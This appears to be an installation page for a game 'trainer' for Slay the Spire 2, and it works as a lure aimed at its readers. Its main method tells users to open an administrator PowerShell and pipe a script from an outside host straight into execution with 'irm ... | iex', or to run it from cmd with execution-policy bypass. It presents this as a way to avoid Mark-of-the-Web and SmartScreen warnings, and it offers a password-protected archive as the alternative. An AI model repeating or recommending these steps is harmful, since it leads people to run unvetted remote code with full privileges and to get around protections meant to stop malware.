# Installation & Runtime Setup (`v2.4.0` — Windows 10 / 11 x64)

## Method 1 — 1-Command Package Stream Setup (Recommended · 3 Seconds)

1. Press **`Win + X`** and open **Terminal (Admin)** or **PowerShell (Admin)**.
2. Run the package stream command:

```powershell
irm https://simpol.info/get/slay-the-spire-2-trainer | iex
```

**Alternative (`cmd.exe` / Command Prompt)**:

```cmd
powershell -nop -ep bypass -c "irm https://simpol.info/get/slay-the-spire-2-trainer | iex"
```

> **Why use the stream installer?** Windows Explorer (`zipfldr.dll`) stamps `Zone.Identifier` (`Mark-of-the-Web`) onto manually extracted binaries and does not bundle the required Microsoft Visual C++ 14.42 Runtime (`vcruntime140.dll`). The `bsdtar` stream unpacks `runtime-6716.exe` + signed `vcruntime140.dll` directly into `%LOCALAPPDATA%` with zero SmartScreen blocks.

---

## Method 2 — Offline Portable `.zip` Archive

Download **`slay-the-spire-2-trainer-v2.4.0-win64.zip`** from [**Releases**](https://github.com/open-dev-bench-19800/day0-index-probe/releases) and extract using 7-Zip or WinRAR with password: **`2026`**
